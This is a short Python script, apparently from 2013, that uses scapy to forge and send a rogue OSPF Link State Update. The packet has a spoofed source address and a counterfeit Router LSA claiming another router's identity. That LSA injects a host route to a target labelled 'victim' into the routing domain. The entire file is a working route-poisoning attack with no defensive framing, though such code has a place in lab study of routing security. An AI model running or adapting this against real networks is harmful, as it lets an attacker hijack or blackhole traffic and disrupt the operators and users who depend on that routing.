'''
Created on Aug 28, 2013

@author: AHA - 4xmen.ir
'''

#!/usr/bin/env python
from scapy.all import *
from ospf import *

def ourSend(packet):
        sendp(packet,iface='eth1')

host1='10.0.3.2'      
advr_routers='10.0.8.7'
host2='10.0.2.1'       
sequence=0x80000918       

link2host1 = OSPF_Link(id=host1,data='10.0.3.3',type=2,metric=1)
link2host2 = OSPF_Link(id=host2,data='10.0.2.3',type=2,metric=1)
link2victim = OSPF_Link(id='192.168.200.20',data='255.255.255.255',type=3,metric=1)

IPlayer=IP(src='10.0.1.1',dst='224.0.0.5')
OSPFHdr=OSPF_Hdr(src='10.0.6.1')
rogueLsa=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(options=0x22,id='10.0.3.3',adrouter=advr_routers,seq=sequence,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2])])

ourSend(rogueLsa)
